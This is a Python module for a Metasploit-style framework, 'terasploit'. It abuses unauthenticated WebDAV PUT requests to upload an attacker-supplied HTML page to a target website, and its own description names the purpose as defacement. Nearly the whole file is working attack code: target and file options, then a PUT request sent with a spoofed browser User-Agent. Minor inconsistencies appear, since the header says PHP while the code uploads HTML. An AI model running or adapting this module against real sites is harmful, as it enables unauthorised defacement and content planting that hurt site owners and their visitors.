#######
# Module/http_request: XAMPP WebDav Upload PHP
#######

from libs.terasploit.framework.opts.opt_container import *
from libs.terasploit.framework.info.info_container import *
from libs.terasploit.framework.module.auxiliary import *

class TerasploitModule(Auxiliary):

    def initialize(self,info_only: bool = False) -> None:
        update_info (
            {
                'Module'  : Module.auxiliary,
                'Name'    : 'WebDav Unauthenticated HTML file upload via put request',
                'Author'  : [
                    'Charlie <rupture6.dev[at]gmail.com>'
                ],
                'Description' : [
                    'Takes advantage of unauthenticated put requests WebDav',
                    'vulnerability on the target allowing user to upload a',
                    'deface page to the website.'
                ]
            }
        )

        if info_only:
            return
        
        register_option ('auxiliary',opt=[
            OptURL.new('target',['','yes','url of the target']),
            OptFile.new('html_file',['','yes','path of the html file to upload']),
            OptString.new('html_name',['filename','yes','html file name to use'])
        ])

    def run(self) -> tuple[str, bool]: 
        target, html_file, html_name = self.OPT()
        self.ParseURL(target)

        try:
            with open(html_file, 'r') as f:
                html_content = f.read()
                
            http_request = HTTPClient.Request(
                'put',
                url=f'{Target.scheme}://{Target.hostname}/{html_name}.html',
                headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'},
                data=html_content
            )
            
            if http_request.status_code in self.good_status_code():
                info_print (f"HTML file uploaded: {Target.scheme}://{Target.hostname}/{html_name}.html",)
                info_print (f'Status code: {http_request.status_code}',type='green')
                return 'done', True
            else:
                info_print ('Failed to upload HTML file.',type='red')
                info_print (f'Status code: {http_request.status_code}')
                return 'done', True

        except Exception as error:
            info_print (error,type='red')
            return 'exception', True